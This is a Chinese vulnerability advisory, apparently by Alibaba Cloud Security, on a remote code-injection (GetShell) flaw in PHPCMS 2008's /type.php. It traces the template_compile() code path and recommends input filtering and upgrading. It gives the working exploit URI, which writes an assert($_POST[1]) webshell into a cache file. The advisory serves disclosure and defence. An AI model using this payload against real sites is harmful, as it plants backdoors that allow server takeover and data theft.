***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 前言

 **11月4日，阿里云安全首次捕获PHPCMS 2008版本的/type.php远程GetShell
0day利用攻击，攻击者可以利用该漏洞远程植入webshell，导致文件篡改、数据泄漏、服务器被远程控制等一系列严重问题。建议受影响用户尽快升级到最新版本修复。**

> PHPCMS网站内容管理系统是国内主流CMS系统之一，同时也是一个开源的PHP开发框架。
>
> PHPCMS最早于2008年推出，最新版已出到v9.6.3，但由于稳定、灵活、开源的特性，时至今日，PHPCMS2008版本仍被许多网站所使用。

![php-1024x538.png](https://image.3001.net/images/20181128/15433951478850.png!small)

## 漏洞细节

当攻击者向安装有PHPCMS2008的网站发送uri为如下文本的payload：

    
    
    /type.php?template=tag_(){};@unlink(_FILE_);assert($_POST[1]);{//../rss

那么"@unlink(_FILE_);assert($_POST[1]);"这句恶意php指令将被写入网站的/cache_template/rss.tpl.php文件。

## 漏洞原理

该漏洞源于PHPCMS2008源码中的/type.php文件。该文件包含如下代码：

    
    
    if(empty($template)) $template = 'type';
    
    ...
    
    include template('phpcms', $template);

这里$template变量是用户能够通过传入参数控制的，同时可以看到该变量之后会被传入template()方法。而template()方法在/include/global.func.php文件中定义，包含如下代码：

    
    
    template_compile($module, $template, $istag);

不难看出，这里会继续调用/include/template.func.php中的template_compile()：

    
    
    function template_compile($module, $template, $istag = 0)
    
    {
    
    	...
    
    	$compiledtplfile = TPL_CACHEPATH.$module.'_'.$template.'.tpl.php';
    
    	$content = ($istag || substr($template, 0, 4) == 'tag_') ? '<?php function _tag_'.$module.'_'.$template.'($data, $number, $rows, $count, $page, $pages, $setting){ global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);?>'.template_parse($content, 1).'<?php } ?>' : template_parse($content);
    
    	$strlen = file_put_contents($compiledtplfile, $content);
    
    	...
    
    }

在这个方法中，$template变量同时被用于$compiledtplfile中文件路径的生成，和$content中文件内容的生成。

而前文所述的攻击payload将$template变量被设置为如下的值：

    
    
    tag_(){};@unlink(_FILE_);assert($_POST[1]);{//../rss

所以在template_compile()方法中，调用file_put_contents()函数时的第一个参数就被写成了

    
    
    data/cache_template/phpcms_tag_(){};@unlink(_FILE_);assert($_POST[1]);{//../rss.tpl.php

这将被php解析成"data/cache_template/rss.tpl.php"。

最终，"@unlink(_FILE_);assert($_POST[1]);"将被写入该文件。

## 影响范围

虽然距离PHPCMS2008版本的推出已经10年，但仍有不少网站正在使用PHPCMS2008，包括政府、企业的网站；根据Fofa网络空间安全搜索引擎的全网精确搜索结果显示，还有近200个使用PHPCMS2008版本的网站；而如果使用模糊匹配对网站进行识别，匹配结果更达上万个。

通过利用该漏洞，攻击者在向路径可控的文件写入恶意脚本代码后，后续将能够向该文件发送webshell指令，在服务器上执行任意代码，因此该代码注入漏洞的影响较大。

## 手动修复

临时解决可以在/type.php文件中对$template变量进行过滤，避免用户输入的含有"("、"{"等符号的内容混入，并被当做路径和脚本内容处理。

但由于PHPCMS2008版本过旧，用户应尽量升级到最新版本的PHPCMS，才能够更好地保障安全。

 ***本文作者：阿里云安全团队悟泛，转载请注明来自FreeBuf.COM**

